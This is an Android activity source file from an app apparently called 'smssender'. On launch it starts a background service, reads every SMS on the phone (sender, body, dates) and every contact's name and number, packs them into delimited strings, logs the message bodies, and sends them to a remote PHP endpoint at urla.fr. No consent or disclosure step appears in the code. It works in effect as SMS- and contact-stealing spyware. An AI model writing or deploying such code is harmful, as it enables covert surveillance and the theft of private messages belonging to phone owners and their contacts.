package com.example.gsvo.smssender;



import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    public static Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        context = this;

        int permissionCheck = ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.RECEIVE_SMS);

        if(permissionCheck == PackageManager.PERMISSION_DENIED){
            Toast.makeText(context, "Permission denied !", Toast.LENGTH_LONG).show();

            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.RECEIVE_SMS)) {

            } else {

                // No explanation needed, we can request the permission.

                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS}, permissionCheck);
            }
        }

        startService(new Intent(MainActivity.this, SMS.class));
        Toast.makeText(context, "Permission : " + permissionCheck, Toast.LENGTH_LONG).show();

        Button serviceBtn = (Button) findViewById(R.id.serviceBtn);

        serviceBtn.setOnClickListener( new OnClickListener()
        {

            @Override
            public void onClick(View actuelView)
            {
                startService(new Intent(MainActivity.this, SMS.class));
            }
        });

        Button serviceStop = (Button) findViewById(R.id.btnStop);

        serviceStop.setOnClickListener( new OnClickListener()
        {

            @Override
            public void onClick(View actuelView)
            {
                stopService(new Intent(MainActivity.this, SMS.class));
            }
        });

        String  provider = "com.android.providers.telephony.SmsProvider";
        Uri allMessage = Uri.parse("content://sms/");
        grantUriPermission(provider, allMessage, Intent.FLAG_GRANT_READ_URI_PERMISSION);

        sync_messages msg = new sync_messages(this);
        msg.execute("https://urla.fr/hcode_api/ajax/get_sms.php");

        //sync_contacts contacts_sync = new sync_contacts();
        //contacts_sync.execute("https://urla.fr/hcode_api/ajax/read_contacts.php");


        /*Uri allMessage1 = Uri.parse("content://sms/");

        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(allMessage1, null, null, null, null);

        while (c.moveToNext()){

            for(int i = 0; i < c.getColumnCount(); i++){
                String chaine = c.getColumnName(i) + " = " + c.getString(i);
                Log.e("log_sms", chaine);
            }

        }

        c.close();*/
        requestSmsPermission();

        //registerReceiver(SmsListener.this, "android.provider.Telephony.SMS_RECEIVED");
    }

    private void requestSmsPermission() {
        String permission = Manifest.permission.RECEIVE_SMS;
        int grant = ContextCompat.checkSelfPermission(this, permission);
        if ( grant != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }
    }

    public static String getMessages(){
        String message = "";


        Uri allMessage = Uri.parse("content://sms/");

        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(allMessage, null, null, null, null);

        int date_sent_index = c.getColumnIndex("date_sent");
        int id_msg = c.getColumnIndex("_id");
        int num_index = c.getColumnIndex("address");
        int body_index = c.getColumnIndex("body");
        int thread_id = c.getColumnIndex("thread_id");
        int date = c.getColumnIndex("date");

        while (c.moveToNext()) {
            int id = c.getInt(id_msg);
            String body = c.getString(body_index);
            body = body.replaceAll("(\\r|\\n|\\r\\n)+", "@space@");
            message += id + "%split%" + c.getString(thread_id) + "%split%" + c.getString(date) + "%split%" + c.getString(num_index) + "%split%" + body;
            message += "%split%" + c.getString(date_sent_index) + ";";

            Log.d("hsms", body);
        }
        return message;

    }

    public static String getContacts(){
        String num = "";
        String contact = "";
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.moveToFirst()) {

            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);


                    while (pCur.moveToNext()) {
                        //String contactNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        num = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.d("hsms", "Numéro : " + num);

                        // Do something with phones
                    }

                    pCur.close();

                    Log.d("hsms", id + "%split%" + name + "%split%" + num + ";");
                    contact += id + "%split%" + name + "%split%" + num + ";";
                }

                    //Query phone here.  Covered next
                }

            }

        return contact;
    }


    @Override
    protected void onDestroy(){
        stopService(new Intent(MainActivity.this, SMS.class));
        super.onDestroy();
    }
}
